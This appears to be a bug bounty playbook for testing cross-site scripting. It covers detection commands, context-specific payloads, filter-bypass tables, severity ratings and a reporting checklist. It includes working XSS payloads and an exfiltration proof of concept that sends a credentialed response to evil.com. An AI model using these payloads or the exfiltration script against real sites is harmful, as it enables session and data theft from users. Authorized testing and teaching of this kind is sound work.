# XSS Testing Playbook — Bug Bounty

> Source: PortSwigger Web Security Academy. Cover: reflected, stored, DOM-based XSS.

---

## Quick Detection

```bash
# 1. Reflected XSS — inject marker, check response
MARKER="xSS7m$(date +%s)"
curl -s "https://TARGET/?q=$MARKER" | grep -o "$MARKER" && echo "REFLECTED" || echo "not reflected"

# 2. Check encoding context (HTML/attr/js/url)
curl -s "https://TARGET/?q=$MARKER" | grep -oP '.{0,50}$MARKER.{0,50}'

# 3. DOM XSS — check source in client JS
curl -s "https://TARGET/page" | grep -oP '(location\.hash|location\.search|document\.URL|document\.referrer|window\.name|document\.cookie)[^;]*'
```

---

## Payloads by Context

| Context | Payload |
|---|---|
| HTML body | `<script>alert(1)</script>` |
| HTML tag attribute | `" onfocus=alert(1) autofocus="` |
| JS string | `';alert(1)//` |
| JS template literal | `${alert(1)}` |
| URL href | `javascript:alert(1)` |
| SVG | `<svg/onload=alert(1)>` |
| Event handler | `<img src=x onerror=alert(1)>` |
| Attribute injection | `" onmouseover=alert(1) "` |

**PoC note (PortSwigger):** Chrome ≥92 blocks `alert()` in cross-origin iframes → use `print()` as alternative PoC payload.

### Filter Bypass (common)

| Filter | Bypass |
|---|---|
| `<script>` blocked | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>` |
| `alert` blocked | `print()`, `confirm()`, `prompt()`, `fetch()` |
| Case-sensitive block | `<ScRiPt>`, mixed case |
| Space blocked | Tab `%09`, newline `%0a`, `/` |
| Single quotes blocked | Backtick, HTML entities |
| `on*` handlers blocked | `<a href=javascript:alert(1)>`, `<svg>` |
| `<>` blocked | Attribute-context injection only |
| WAF pattern `alert` | JS unicode escapes `\u0061lert()`, template literal concat |

---

## Vulnerability Types

### Reflected XSS
- Input reflected immediately in HTTP response; deliver via crafted URL
- **Test:** unique marker in every entry point → grep responses → test each reflection point per context

### Stored XSS
- Input saved (DB/second-order source: webmail, SMTP, packet data) and served to other users later
- **Test:** submit payload → view as different user
- Sinks: comments, nicknames, contact details, message boards

### DOM-Based XSS
- Vuln in client-side code (source→sink); server response may be clean
- URL-based: marker in param → search DOM in devtools → test each location
- Non-URL sources (`document.cookie`) / non-HTML sinks (`setTimeout`): requires JS code review

---

## Exploit Chains

- **CSP:** if `Content-Security-Policy` present, CSP may hinder exploitation — but is often circumventable. Analyze directives for bypass.
- **Dangling markup injection:** when full XSS blocked by filters — capture cross-domain data (incl. CSRF tokens) via unclosed tag attribute injection.

### Basic Exfil PoC
```html
<script>
var x = new XMLHttpRequest();
x.onload = function(){ fetch('https://evil.com/log?c='+encodeURIComponent(x.responseText)); };
x.open('GET', 'https://TARGET/SECRET_ENDPOINT', true);
x.withCredentials = true;
x.send();
</script>
```

---

## Prevention Reference (what to check for remediation section)

1. Filter input on arrival (whitelist, strictest possible)
2. Encode data on output — HTML/URL/JS/CSS encoding per output context
3. Appropriate response headers: `Content-Type` + `X-Content-Type-Options: nosniff`
4. CSP as last line of defense

---

## By-Design Filters (SKIP)

- Reflected input in `<a href>` requiring deliberate user navigation (no auto-exec)
- Self-XSS only (user must paste payload themselves) unless chainable
- Error pages with same-origin-only access and no auth data

---

## Severity Guide

| Impact | Severity |
|---|---|
| XSS on unauthenticated page, no data | LOW / INFO |
| XSS steals public data | LOW |
| XSS → CSRF token theft → account takeover chain | HIGH |
| Stored XSS auto-exec + session steal | CRITICAL |
| XSS on internal subdomain, no reachable users | INFO |

---

## Reporting Checklist

- [ ] Vulnerable URL + parameter
- [ ] Type: reflected / stored / DOM
- [ ] Context + filter bypass documented
- [ ] CSP analysis
- [ ] Full PoC with demonstrated impact (not just alert)
- [ ] Severity = proven impact

> ⚠️ NEVER claim severity from alert() alone. Blocked exploit chain = INFO (master KB rule).